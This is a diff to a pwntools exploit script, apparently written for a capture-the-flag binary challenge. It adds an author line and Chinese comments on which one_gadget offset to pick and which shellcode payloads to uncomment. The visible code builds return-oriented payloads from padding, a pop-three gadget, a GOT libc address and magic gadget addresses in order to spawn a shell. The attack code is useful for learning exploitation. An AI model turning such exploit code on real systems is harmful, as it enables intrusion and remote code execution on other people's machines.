@@ -1,5 +1,6 @@
 #!/usr/bin/python env
 #coding:utf-8
+#authro:KimballCho
 
 from pwn import *
 
@@ -99,6 +100,7 @@ pop_3_gadget = 0x08049459
 offset_magic_addr_1 = [0x3a80c,0x3a80e,0x3a812,0x3a819]
 #在调用到0x3a812的时候，pwn失败，其他均成功反编译后查看，调用前三个时，都会预先调用sigprocmask函数，猜测可能是因为EIP的位置
 #导致这个函数不能成功执行，但是one_gadget并没有检测到
+#修改key，使用对应gadget
 magic_addr_1 = offset_addr + offset_magic_addr_1[3]
 print 'magic_addr_1 => ' + hex(magic_addr_1)
 
@@ -115,6 +117,7 @@ print 'magic_addr_2 => ' + hex(magic_addr_2)
 pop_3_gadget = 0x08049459
 payload2 = p32(0) * 23 + p32(pop_3_gadget) + p32(got_libc_real) + p32(0) + p32(0) + p32(magic_addr_2)
 payload2 += p32(0)
+#去除注释，使用此payload
 #shellPwn(payload2)
 
 
@@ -132,6 +135,7 @@ magic_addr_2_0 = offset_addr + offset_magic_addr_2[0]
 print 'magic_addr_2_0 => ' + hex(magic_addr_2_0)
 payload2_0 = p32(0) * 23 + p32(pop_3_gadget) + p32(got_libc_real) + p32(0) + p32(0)
 payload2_0 += p32(libc_xor_gadget) + p32(magic_addr_2_0)
+#去除注释，使用此payload
 #shellPwn(payload2_0)
 
 #或者
